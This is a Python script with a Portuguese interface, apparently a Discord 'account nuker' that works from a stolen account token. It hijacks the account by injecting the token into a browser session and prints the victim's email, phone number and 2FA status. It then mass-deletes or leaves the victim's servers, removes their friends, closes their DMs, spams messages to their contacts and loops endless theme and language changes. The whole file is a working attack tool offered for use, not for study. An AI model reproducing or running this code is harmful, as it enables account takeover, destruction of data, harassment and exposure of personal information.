import threading, requests, discord, random, time, os

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
guildsIds = []
friendsIds = []
channelIds = []
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Token Inválido", e)
            input("Pressione qualquer tecla para sair..."); exit(0)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}ID{Fore.RESET}]         {userID}
            [{Fore.RED}Nome de Usuário{Fore.RESET}]       {userName}
            [{Fore.RED}2FA{Fore.RESET}]        {mfa}

            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Telefone{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}

            ''')
            input()

def tokenFuck(token):
    headers = {'Authorization': token}
    gdel = input(f'Deseja excluir todos os servidores desta conta? s/n [Não use maiúsculas] > ')
    fdel = input('Deseja remover todos os amigos desta conta? s/n [Não use maiúsculas] > ')
    sendall = input('Deseja enviar uma mensagem direta para todas as DMs recentes desta conta? s/n [Não use maiúsculas] > ')
    fremove = input('Deseja excluir todas as DMs recentes desta conta? s/n [Não use maiúsculas] > ')
    gleave = input('Deseja sair de todos os servidores desta conta? s/n [Não use maiúsculas] > ')
    gcreate = input('Deseja criar servidores em massa nesta conta?  s/n [Não use maiúsculas] > ')
    dlmode = input('Deseja alternar entre o modo claro e escuro repetidamente? s/n [Não use maiúsculas] > ')
    langspam = input('Deseja alterar o idioma da vítima? s/n [Não use maiúsculas] > ')
    print(f"[{Fore.RED}+{Fore.RESET}] Hackeando...")

    if sendall == 's':
        try:
            sendmessage = input('O que você gostaria de enviar para todas as DMs recentes? > ')
            for id in channelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'Mensagem privada enviada para o ID {id}')
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if gleave == 's':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
                print(f'Servidor deixado: {guild}')
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if fdel == 's':
        try:
            for friend in friendsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                print(f'Amigo removido: {friend}')
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if fremove == 's':
        try:
            for id in channelIds:
                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                print(f'DM com ID {id} fechada')
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if gdel == 's':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
                print(f'Servidor excluído: {guild}')
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if gcreate == 's':
        try:
            gname = input('Qual nome de servidor deseja usar para criação em massa? > ')
            gserv = input('Quantos servidores deseja criar? [máximo de 100]')
            for i in range(int(gserv)):
                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                print(f'Servidor {gname} criado. Número: {i}')
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if dlmode == 's':
        try:
            modes = cycle(["light", "dark"])
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    if langspam == 's':
        try:
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        except Exception as e:
            print(f'Erro detectado, ignorando. {e}')

    time.sleep(9999)

def getBanner():
    banner = f'''
                [{Fore.RED}Criador: {Fore.RESET} Hash]
                [{Fore.RED}Github: {Fore.RESET} Modificado, traduzido e atualizado By: Machine]
                [{Fore.RED}1{Fore.RESET}] Destruir uma conta
                [{Fore.RED}2{Fore.RESET}] Obter informações da conta
                [{Fore.RED}3{Fore.RESET}] Conectar-se à conta usando Token

    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
    return banner

def startMenu():
    print(getBanner())
    print(f'[{Fore.RED}>{Fore.RESET}] Sua escolha', end=''); choice = str(input('  :  '))


    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Token da Conta', end=''); token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Número de threads (número)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Token da Conta', end=''); token = input('  :  ')
        tokenInfo(token)
    
    elif choice == '3':
        print(f'[{Fore.RED}>{Fore.RESET}] Token da Conta', end=''); token = input('  :  ')
        tokenLogin(token)


    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()


if __name__ == '__main__':
    startMenu()
